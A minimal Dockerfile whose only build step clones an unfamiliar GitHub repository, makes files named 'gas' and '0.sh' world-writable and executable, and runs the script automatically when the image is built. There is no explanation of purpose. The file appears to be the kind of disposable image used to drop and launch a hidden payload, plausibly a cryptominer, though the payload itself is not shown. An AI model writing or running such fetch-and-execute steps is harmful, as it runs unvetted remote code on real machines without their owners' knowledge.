FROM debian:9.5-slim

RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
